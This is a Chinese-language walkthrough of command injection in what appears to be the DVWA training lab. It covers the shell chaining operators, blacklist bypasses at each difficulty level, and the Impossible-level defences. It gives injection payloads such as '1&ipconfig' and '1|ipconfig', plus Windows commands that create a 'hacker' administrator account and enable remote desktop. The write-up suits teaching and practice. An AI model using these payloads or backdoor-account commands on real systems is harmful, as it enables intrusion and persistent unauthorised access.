命令注入是在调用系统命令的web应用程序中拼接系统命令或绕过黑名单的方式去执行恶意命令。在linux和windows下都可以使用的常见的拼接符号：|、||、&和&&。

实例

Command A & Command B# 执行A的命令也执行B的命令。Command A && Command B# 在A执行成功的情况下执行B，A执行失败就不会执行B，相当于逻辑中与。Command A | Command B# 将A执行的结果作为B的输入，因此无论A执行结果如何，都会执行B。Command A || Command B# 在A执行失败的情况下执行B，A执行成功则不会执行B，和逻辑或一样。Command A ; Command B# A和B都执行。


代码执行常用语句

Dir# 查看目录Net user# 查看用户Whoami# 查看系统权限net user /add hacker 123456# 创建用户名为 hacker 密码为123456的用户net localgroup Administrators /add hacker# 将hacker账户添加到管理员用户组net start termservice# 开启远程桌面服务


LOW


要求输入一个ip地址，输入ip地址后服务器会对用户输入的ip地址执行ping命令。我们可以通过使用管道连接符在执行完ping命令后执行其他恶意命令。

Payload：1&ipconfig


结果如图：

 


可以看到服务器的ip地址也显示出来，证明拼接的代码也执行成功。可以尝试执行其他的命令进一步测试。


Medium


查看源代码后发现服务器使用黑名单的机制过滤了&&和；符号，我们可以使用其他不在黑名单中的管道符进行拼接语句，例如：&、|和||。

Payload：1&ipconfig




High


查看源代码后发现服务器对所有的拼接符号进行过滤，但是仔细查看后发现过滤的符号“|”后面存在空格，所以实际过滤的符号为“| ”，意味着我们可以使用“|”进行命令注入。

Payload：1|ipconfig




Impossible


  1. 使用stripslashes（）去除了反斜杠。


  2. 加入Anti-CSRFtoken，服务器校验token值，防止CSRF攻击。


  3. 使用explode（）函数将字符串分割后返回为数组，使用is_numeric（）函数判断是否为数字，从而使用户只能传入ip值。
